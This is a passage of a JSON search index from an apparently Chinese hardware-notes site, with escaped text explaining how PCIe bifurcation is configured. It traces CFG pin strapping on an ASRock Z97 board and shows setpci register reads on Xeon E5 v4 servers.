\u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b\u7684\u200b\u9875\u200b\uff0c\u200b\u4e00\u200b\u5f00\u59cb\u200b\u662f\u200b\u6ca1\u6709\u200b\u5206\u914d\u200b\u7684\u200b\uff0c\u200b\u76f4\u5230\u200b\u7b2c\u4e00\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u51fa\u73b0\u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b\uff0c\u200b\u7136\u540e\u200b OS \u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u9875\u200b\uff0c\u200b\u518d\u200b\u66f4\u65b0\u200b\u9875\u8868\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7528\u4e8e\u200b DMA \u200b\u7684\u200b\u7269\u7406\u200b\u9875\u200b\u4e5f\u200b\u53ef\u4ee5\u200b Swap \u200b\u6216\u8005\u200b\u5ef6\u8fdf\u200b\u5206\u914d\u200b\u3002</p>"},{"location":"hardware/pcie.html#bifurcation","title":"Bifurcation","text":"<p>PCIe Bifurcation \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u8ba9\u200b PCIe \u200b\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\u3002\u200b\u4ece\u200b CPU \u200b\u51fa\u6765\u200b\u7684\u200b\u51e0\u8def\u200b PCIe\uff0c\u200b\u5b83\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u4e00\u822c\u200b\u662f\u200b\u786e\u5b9a\u200b\u7684\u200b\uff0c\u200b\u6bd4\u5982\u200b\u6709\u200b\u4e00\u4e2a\u200b x16\uff0c\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u60f3\u8981\u200b\u63a5\u200b\u591a\u4e2a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u4f8b\u5982\u200b\u628a\u200b x16 \u200b\u5f53\u6210\u200b\u4e24\u4e2a\u200b x8 \u200b\u6765\u200b\u7528\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b PCIe Bifurcation\u3002\u200b\u8fd9\u200b\u9700\u8981\u200b PCIe \u200b\u4e24\u7aef\u200b\u7684\u200b\u652f\u6301\u200b\uff0cCPU \u200b\u7aef\u200b\u9700\u8981\u200b\u53ef\u200b\u914d\u7f6e\u200b PCIe Bifurcation\uff0c\u200b\u4e0d\u7136\u200b\u53ea\u80fd\u200b\u4ece\u200b\u4e00\u4e2a\u200b x16 \u200b\u964d\u7ea7\u200b\u5230\u200b\u4e00\u4e2a\u200b x8\uff0c\u200b\u5269\u4e0b\u200b\u7684\u200b 8x \u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u5229\u7528\u200b\u4e86\u200b\uff1b\u200b\u8bbe\u5907\u200b\u7aef\u200b\u9700\u8981\u200b\u62c6\u5206\u200b\u5361\u200b\uff0c\u200b\u628a\u200b x16 \u200b\u7684\u200b\u4fe1\u53f7\u200b\u5206\u6210\u200b\u4e24\u8def\u200b\uff0c\u200b\u7136\u540e\u200b\u63d0\u4f9b\u200b\u4e24\u4e2a\u200b PCIe \u200b\u63d2\u69fd\u200b\u4ee5\u53ca\u200b\u4f7f\u7528\u200b Clock Buffer \u200b\u6765\u200b\u63d0\u4f9b\u200b\u4e0b\u6e38\u200b\u8bbe\u5907\u200b\u7684\u200b\u65f6\u949f\u200b\uff0c\u200b\u6709\u65f6\u200b\u5219\u200b\u662f\u200b\u4e3b\u677f\u200b\u8bbe\u8ba1\u200b\u65f6\u200b\u5c31\u200b\u505a\u200b\u4e86\u200b\u62c6\u5206\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b\u62c6\u5206\u200b\u5361\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u522b\u200b\u4ece\u200b\u684c\u9762\u200b\u5e73\u53f0\u200b\u548c\u200b\u670d\u52a1\u5668\u200b\u5e73\u53f0\u200b\uff0c\u200b\u7814\u7a76\u200b PCIe Bifurcation \u200b\u662f\u200b\u5982\u4f55\u200b\u914d\u7f6e\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/pcie.html#_6","title":"\u684c\u9762\u200b\u5e73\u53f0","text":"<p>\u200b\u5728\u200b\u684c\u9762\u200b\u5e73\u53f0\u200b\u4e0a\u200b\uff0cIntel CPU \u200b\u4f1a\u200b\u6839\u636e\u200b\u542f\u52a8\u200b\u65f6\u200b CFG \u200b\u5f15\u811a\u200b\u7684\u200b\u503c\u6765\u200b\u51b3\u5b9a\u200b PCIe Bifurcation \u200b\u8bbe\u7f6e\u200b\u3002CFG \u200b\u7684\u200b\u503c\u200b\u4e0e\u200b PCIe Bifurcation \u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u53ef\u4ee5\u200b\u4ece\u200b Datasheet \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <p>\u200b\u5b9e\u9645\u200b\u627e\u200b\u4e00\u4e2a\u200b\u4e3b\u677f\u200b\u6765\u200b\u7814\u7a76\u200b\u4e00\u4e0b\u200b\u3002\u200b\u578b\u53f7\u200b\u662f\u200b ASRock Fatal1ty Z97X Killer\uff0c\u200b\u4ece\u200b\u4e3b\u677f\u200b\u7684\u200b\u63cf\u8ff0\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff1a<code>3 x PCI Express 3.0 x16 Slots (PCIE2/PCIE4/PCIE6: single at x16 (PCIE2); dual at x8 (PCIE2) / x8 (PCIE4); triple at x8 (PCIE2) / x4 (PCIE4) / x4 (PCIE6)</code>\uff0c\u200b\u8bf4\u660e\u200b\u5b83\u200b\u662f\u200b\u652f\u6301\u200b PCIe Bifurcation \u200b\u7684\u200b\uff0c\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e09\u4e2a\u200b PCIe Slot\uff0c\u200b\u652f\u6301\u200b\u4e09\u79cd\u200b\u6a21\u5f0f\u200b\uff1a</p> <ul> <li>PCIE2 Slot x16</li> <li>PCIE2 Slot x8, PCIE4 Slot x8</li> <li>PCIE2 Slot x8, PCIE4 Slot x4, PCIE6 Slot x4</li> </ul> <p>\u200b\u5728\u200b \u200b\u7f51\u4e0a\u200b \u200b\u627e\u5230\u200b\u8be5\u200b\u4e3b\u677f\u200b\u7684\u200b \u200b\u539f\u7406\u56fe\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b OpenBoardView \u200b\u8f6f\u4ef6\u200b\u6253\u5f00\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b CPU \u200b\u63d2\u69fd\u200b\u662f\u200b LGA1150\uff0c\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u517c\u5bb9\u200b\u7684\u200b CPU \u200b\u7248\u672c\u200b i7-4771\uff0c\u200b\u4e0b\u8f7d\u200b Datasheet\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u51b3\u5b9a\u200b PCIe Bifurcation \u200b\u7684\u200b\u5f15\u811a\u200b\u662f\u200b <code>CFG[6:5]</code>\uff1a</p> <ul> <li><code>CFG[6:5]=00</code>: 1x8, 2x4</li> <li><code>CFG[6:5]=10</code>: 2x8</li> <li><code>CFG[6:5]=11</code>: 1x16</li> </ul> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fd9\u200b\u4e09\u79cd\u200b\u914d\u7f6e\u200b\u548c\u200b\u4e3b\u677f\u200b\u7f51\u7ad9\u200b\u4e0a\u200b\u63cf\u8ff0\u200b\u7684\u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002\u200b\u65e2\u7136\u200b\u4e3b\u677f\u200b\u652f\u6301\u200b Bifurcation\uff0c\u200b\u8bf4\u660e\u200b\u4e00\u5b9a\u200b\u6709\u200b\u529e\u6cd5\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]</code> \u200b\u4e3a\u200b\u4ee5\u4e0a\u200b\u4e09\u79cd\u200b\u53d6\u503c\u200b\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\uff0c\u200b\u8981\u200b\u627e\u5230\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u600e\u4e48\u200b\u8fde\u63a5\u200b <code>CFG[6:5]</code>\u3002\u200b\u5728\u200b\u539f\u7406\u56fe\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b LGA1150 \u200b\u7684\u200b <code>U39 CPU_CFG5</code> \u200b\u548c\u200b <code>U40 V_CFG6</code>\uff0c\u200b\u7ee7\u7eed\u200b\u5f80\u4e0b\u200b\u627e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u4eec\u200b\u901a\u8fc7\u200b\u7535\u963b\u200b\u8fde\u5230\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b BAT54C \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ea\u200b\u9700\u8981\u200b\u770b\u200b BAT54C \u200b\u7b2c\u4e09\u4e2a\u200b\u5f15\u811a\u200b N105955695 \u200b\u7684\u200b\u7535\u5e73\u200b\u3002N105955695 \u200b\u63a5\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b 2N7002BKS \u200b\u82af\u7247\u200b\u4e0a\u200b\uff0c\u200b\u6839\u636e\u200b\u7535\u8def\u56fe\u200b\uff0c\u200b\u6700\u540e\u200b\u662f\u200b\u8981\u200b\u770b\u200b <code>X4_PRSNT1#</code> \u200b\u4fe1\u53f7\u200b\u3002</p> <p><code>X4_PRSTN1#</code> \u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b PCIE6 \u200b\u4e0a\u200b\uff0c\u200b\u5982\u679c\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>X4_PRSTN1#</code> \u200b\u4fe1\u53f7\u200b\u751f\u6548\u200b\uff0c\u200b\u6839\u636e\u200b\u5206\u6790\u200b\u51fa\u6765\u200b\u7684\u200b\u7535\u8def\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u4f7f\u5f97\u200b <code>CFG[6:0]</code> \u200b\u53d8\u4e3a\u200b 00\uff0c\u200b\u5bf9\u5e94\u200b 1x8+2x4 \u200b\u7684\u200b Bifurcation \u200b\u6a21\u5f0f\u200b\u3002\u200b\u56de\u60f3\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u5728\u200b\u4e3b\u677f\u200b\u652f\u6301\u200b\u7684\u200b\u4e09\u79cd\u200b PCIe Bifurcation \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u53ea\u6709\u200b\u8fd9\u200b\u4e00\u79cd\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b PCIE6 Slot\u3002\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u5728\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u200b\u8bf4\u660e\u200b\u7528\u6237\u200b\u9700\u8981\u200b\u7684\u200b\u662f\u200b 1x8+2x4 \u200b\u7684\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u81ea\u52a8\u200b\u914d\u7f6e\u200b CPU \u200b\u7684\u200b <code>CFG[6:5]</code> \u200b\u4fe1\u53f7\u200b\u4e3a\u200b\u9884\u671f\u200b\u503c\u200b\u3002</p> <p>\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]</code> \u200b\u8fd8\u200b\u4e0d\u591f\u200b\uff0c\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0c\u200b\u4e3b\u677f\u200b\u9700\u8981\u200b\u8d1f\u8d23\u200b\u628a\u200b PCIE2/4/6 \u200b\u7684\u200b\u4fe1\u53f7\u200b\u8fde\u63a5\u200b\u5230\u200b\u539f\u6765\u200b\u7684\u200b\u5b8c\u6574\u200b\u7684\u200b x16 \u200b\u4e0a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6839\u636e\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u8fde\u63a5\u200b\u4e0d\u540c\u200b\u7684\u200b\u7ebf\u200b\u3002\u200b\u5177\u4f53\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u5f0f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b\u539f\u7406\u56fe\u200b\u4e2d\u200b\u627e\u5230\u200b\uff1a\u200b\u4fe1\u53f7\u200b <code>X4_PRSTN1#</code> \u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b CBTL04083BBS\uff0c\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b PCIe Mux/Demux \u200b\u82af\u7247\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u628a\u200b\u540c\u6837\u200b\u4e00\u7ec4\u200b\u5dee\u5206\u200b\u7ebf\u8fde\u5230\u200b\u4e0d\u540c\u200b PCIe Slot \u200b\u4e0a\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u82af\u7247\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u76ee\u524d\u200b\u63a8\u65ad\u51fa\u200b\u4e86\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\uff1a\u200b\u7528\u6237\u200b\u5728\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u7535\u8def\u200b\u8ba1\u7b97\u200b\u51fa\u200b <code>CFG[6:5]=00</code>\uff0c\u200b\u540c\u65f6\u200b\u914d\u7f6e\u200b\u597d\u200b\u4e86\u200b PCIe Mux/Demux \u200b\u82af\u7247\u200b\uff0c\u200b\u628a\u200b 1x16 \u200b\u5207\u200b\u5206\u4e3a\u200b 1x8+2x4\u3002</p> <p>\u200b\u7ee7\u7eed\u200b\u5f80\u4e0b\u200b\u770b\u200b\uff0c\u200b\u4e3b\u677f\u200b\u5982\u4f55\u200b\u5b9e\u73b0\u200b\u5269\u4e0b\u200b\u4e24\u79cd\u200b\u914d\u7f6e\u200b\uff1a<code>CFG[6:5]=10</code> \u200b\u5bf9\u5e94\u200b 2x8\uff0c<code>CFG[6:5]=11</code> \u200b\u5bf9\u5e94\u200b 1x16\u3002\u200b\u8fd9\u200b\u4e24\u79cd\u200b\u7f16\u7801\u200b\u91cc\u200b\uff0cCFG6 \u200b\u90fd\u200b\u4e3a\u200b 1\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5982\u4f55\u200b\u5904\u7406\u200b CFG5\u3002CFG5 \u200b\u9664\u4e86\u200b\u8fde\u63a5\u200b\u4e0a\u9762\u200b\u63d0\u5230\u200b\u7684\u200b BAT54C \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u200b\u901a\u8fc7\u200b\u53e6\u200b\u4e00\u4e2a\u200b 2N7002BKS \u200b\u82af\u7247\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b <code>NB_X8_PRSENT#</code> \u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u4f60\u200b\u60f3\u200b\u660e\u767d\u200b\u4e86\u200b\u524d\u9762\u200b\u7684\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u5e94\u8be5\u200b\u53ef\u4ee5\u200b\u63a8\u65ad\u200b\u51fa\u6765\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>NB_X8_PRSENT#</code> \u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b PCIE4 Slot \u200b\u4e0a\u200b\u3002\u200b\u5f53\u200b PCIE4 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u540c\u65f6\u200b PCIE6 Slot \u200b\u6ca1\u6709\u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6839\u636e\u200b\u76f8\u5e94\u200b\u7684\u200b PRESENT \u200b\u4fe1\u53f7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b <code>CFG[6:5]=10</code>\u3002\u200b\u5982\u679c\u200b PCIE4 Slot \u200b\u548c\u200b PCIE6 Slot \u200b\u90fd\u200b\u6ca1\u6709\u200b\u63d2\u5165\u200b\u8bbe\u5907\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b <code>CFG[6:5]=11</code>\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u52a8\u6001\u200b\u68c0\u6d4b\u200b\u5e76\u200b\u8ba1\u7b97\u200b\u51fa\u200b <code>CFG[6:5]</code> \u200b\u7684\u200b\u903b\u8f91\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b PCIE6 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 1x8+2x4\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=00</code></li> <li>\u200b\u5426\u5219\u200b\uff0c\u200b\u5982\u679c\u200b PCIE4 Slot \u200b\u63d2\u5165\u200b\u4e86\u200b\u8bbe\u5907\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 2x8\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=10</code></li> <li>\u200b\u5426\u5219\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8981\u200b\u914d\u7f6e\u200b\u4e3a\u200b 1x16\uff0c\u200b\u8bbe\u7f6e\u200b <code>CFG[6:5]=11</code></li> </ol> <p>\u200b\u800c\u200b\u4e3b\u677f\u200b\u8bbe\u8ba1\u8005\u200b\u5c31\u662f\u200b\u8981\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u903b\u8f91\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u7535\u8def\u200b\uff0c\u200b\u7528\u200b BAT54C \u200b\u548c\u200b CBTL04083BBS \u200b\u82af\u7247\u200b\u6765\u200b\u5b9e\u73b0\u200b\u903b\u8f91\u8fd0\u7b97\u200b\u3002</p> <p>\u200b\u987a\u4fbf\u200b\u4e00\u63d0\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b PCIE2/4/6 \u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u90fd\u200b\u662f\u200b x16\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b9e\u9645\u200b\u5206\u914d\u200b\u5230\u200b\u7684\u200b\u5bbd\u5ea6\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u4e0e\u200b\u7269\u7406\u200b\u5c3a\u5bf8\u200b\u4e00\u81f4\u200b\u3002</p>"},{"location":"hardware/pcie.html#_7","title":"\u670d\u52a1\u5668\u200b\u5e73\u53f0","text":"<p>\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u5e73\u53f0\u200b\u4e0a\u200b\uff0cIntel CPU \u200b\u7684\u200b Bifurcation \u200b\u53d8\u6210\u200b\u8fd0\u884c\u200b\u65f6\u200b\u53ef\u200b\u914d\u7f6e\u200b\u7684\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b Xeon E5 v4 Datasheet Volume 2 \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b\u5bc4\u5b58\u5668\u200b <code>pcie_iou_bif_ctrl</code> \u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u5b9a\u4e49\u200b\uff1a</p> <p> </p> PCIe Bifurcation \u200b\u914d\u7f6e\u200b\u65b9\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b Xeon E5 v4 Datasheet Volume 2\uff09 <p>\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u5728\u200b PCIe \u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>setpci</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u8bfb\u53d6\u200b\u6216\u200b\u5199\u5165\u200b\uff1a</p> <pre><code>$ setpci -s 00:00.0 190.B\n00\n$ setpci -s 00:01.0 190.B\n01 # x8\n$ setpci -s 00:02.0 190.B\n04 # x16\n$ setpci -s 00:03.0 190.B\n03 # x8x8\n$ setpci -s 80:02.0 190.B\n04 # x16\n</code></pre> <p>\u200b\u901a\u8fc7\u200b <code>lspci -bPP</code> \u200b\u547d\u4ee4\u200b\u4ee5\u53ca\u200b <code>lspci -vvv</code>\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5728\u200b\u8fd9\u200b\u51e0\u4e2a\u200b PCIe Root Port \u200b\u4e0b\u200b\u7684\u200b\u8bbe\u5907\u200b\u4ee5\u53ca\u200b\u901f\u5ea6\u200b\uff1a</p> <ul> <li>00:01.0(x8)/02:00.0 RAID \u200b\u63a7\u5236\u5668\u200b PCIe 3.0 x8</li> <li>00:02.0(x16)/03:00.0 NVIDIA \u200b\u663e\u5361\u200b PCIe 3.0 x16</li> <li>00:03.0(x8x8)/01:00.0 BCM 2x10G+2x1G \u200b\u7f51\u5361\u200b PCIe 2.0 x8</li> <li>80:02.0(x16)/82:00.0 NVIDIA \u200b\u663e\u5361\u200b PCIe 3.0 x16</li> </ul> <p>\u200b\u5176\u4e2d\u200b\u524d\u200b\u4e09\u4e2a\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b CPU1\uff0c\u200b\u540e\u200b\u4e09\u4e2a\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5230\u200b CPU2</p> <p>\u200b\u5728\u200b BIOS \u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\uff0c\u200b\u8fdb\u5165\u200b Integrated Devices -&gt; Slot Bifurcation \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u53ef\u9009\u9879\u200b\u6709\u200b\uff1a</p> <ul> <li>Slot 1/2/3/5: Default Bifurcation, x4+x4 Bifurcation</li> <li>Slot 4/6: Default Bifurcation, x4+x4+x4+x4 Bifurcation, x8+x8 Bifurcation</li> </ul> <p>\u200b\u9605\u8bfb\u200b R730 \u200b\u6587\u6863\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u6700\u200b\u591a\u200b\u53ef\u4ee5\u200b\u6709\u200b 7 \u200b\u4e2a\u200b Slot\uff0c\u200b\u5176\u4e2d\u200b Slot 1/2/3/5/7 \u200b\u662f\u200b PCIe 3.0x8\uff0cSlot 4 \u200b\u662f\u200b PCIe 3.0 x16\uff0cSlot 6 \u200b\u6839\u636e\u200b\u4e0d\u540c\u200b\u7684\u200b Riser \u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b PCIe 3.0 x8 \u200b\u6216\u200b x16\uff0c\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>PCIe Slot 1: x8, CPU2</li> <li>PCIe Slot 2: x8, CPU2</li> <li>PCIe Slot 3: x8, CPU2</li> <li>PCIe Slot 4: x16, CPU2</li> <li>PCIe Slot 5: x8, CPU1</li> <li>PCIe Slot 6: x8/x16, CPU1</li> <li>PCIe Slot 7: x8, CPU1</li> </ul> <p>\u200b\u9605\u8bfb\u200b E5 v4 CPU \u200b\u6587\u6863\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\u5b83\u200b\u6709\u200b\u4e09\u4e2a\u200b PCIe Port\uff0c\u200b\u4e00\u5171\u200b\u6709\u200b 40 PCIe lanes\uff08x8+x16+x16\uff09\u3002\u200b\u7531\u6b64\u53ef\u77e5\u200b\uff0c\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b x16 \u200b\u8fde\u63a5\u200b\u5230\u200b Slot4/6 \u200b\u4e0a\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b x16 \u200b\u62c6\u200b\u5206\u6210\u200b x8+x8\uff0c\u200b\u8fde\u63a5\u200b\u5230\u200b\u5176\u4f59\u200b\u7684\u200b Slot\u3002\u200b\u6709\u4e9b\u200b\u5947\u602a\u7684\u662f\u200b CPU1 \u200b\u5c11\u200b\u4e86\u200b\u4e00\u4e2a\u200b x8 \u200b\u4e0d\u77e5\u53bb\u5411\u200b\uff0c\u200b\u6000\u7591\u200b\u662f\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e86\u200b RAID \u200b\u5361\u200b\u6216\u8005\u200b\u7f51\u5361\u200b\u4e0a\u200b\u3002\u200b\u7531\u4e8e\u200b\u7f3a\u5c11\u200b\u4e3b\u677f\u200b\u7684\u200b\u539f\u7406\u56fe\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u7814\u7a76\u200b\u3002</p> <p>\u200b\u9057\u61be\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b <code>iou_start_bifurcation</code> \u200b\u5b57\u200b\u6bb5\u200b\u53ea\u80fd\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b 1 \u200b\u6765\u200b\u521d\u59cb\u5316\u200b Bifurcation\uff0c\u200b\u800c\u200b\u8fd9\u200b\u4e00\u822c\u200b\u662f\u200b\u7531\u200b BIOS \u200b\u5b8c\u6210\u200b\u7684\u200b\u3002\u200b\u5982\u679c\u200b BIOS \u200b\u6ca1\u6709\u200b\u505a\u200b\uff0c\u200b\u6216\u8bb8\u200b\u53ef\u4ee5\u200b\u540e\u9762\u200b\u518d\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b\uff1b\u200b\u5982\u679c\u200b BIOS \u200b\u5df2\u7ecf\u200b\u5199\u5165\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u6ca1\u6709\u200b\u63d0\u4f9b\u200b\u53ef\u9009\u9879\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u9006\u5411\u200b BIOS\uff0c\u200b\u4f7f\u7528\u200b UEFITool \u200b\u67e5\u770b\u200b\u662f\u5426\u200b\u6709\u200b\u9690\u85cf\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u5219\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u7ed5\u8fc7\u200b BIOS \u200b\u8bbe\u7f6e\u200b\u53bb\u200b\u4fee\u6539\u200b\u9690\u85cf\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4fee\u6539\u200b BIOS \u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"hardware/pcie.html#_8","title":"\u5c0f\u7ed3","text":"<p>\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0cPCIe Bifurcation \u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u4fdd\u8bc1\u200b\u603b\u200b lane \u200b\u6570\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u8fde\u63a5\u200b\u66f4\u200b\u591a\u200b\u8bbe\u5907\u200b\u7684\u200b\u8f83\u200b\u4f4e\u6210\u672c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5b83\u200b\u9700\u8981\u200b CPU \u200b\u4e00\u4fa7\u200b\u548c\u200b\u8bbe\u5907\u200b\u4e00\u4fa7\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u684c\u9762\u200b\u7ea7\u522b\u200b\u7684\u200b CPU \u200b\u901a\u8fc7\u200b CFG \u200b\u4fe1\u53f7\u200b\u6765\u200b\u914d\u7f6e\u200b\uff0c\u200b\u670d\u52a1\u5668\u7aef\u200b\u7684\u200b CPU \u200b\u901a\u8fc7\u200b PCIe \u200b\u914d\u7f6e\u200b\u7a7a\u95f4\u200b\u6765\u200b\u914d\u7f6e\u200b\u3002\u200b\u8bbe\u5907\u200b\u4e00\u4fa7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7531\u200b\u4e3b\u677f\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e3b\u677f\u200b\u4e0a\u4f1a\u200b\u6709\u200b\u591a\u4f59\u200b\u7684\u200b PCIe 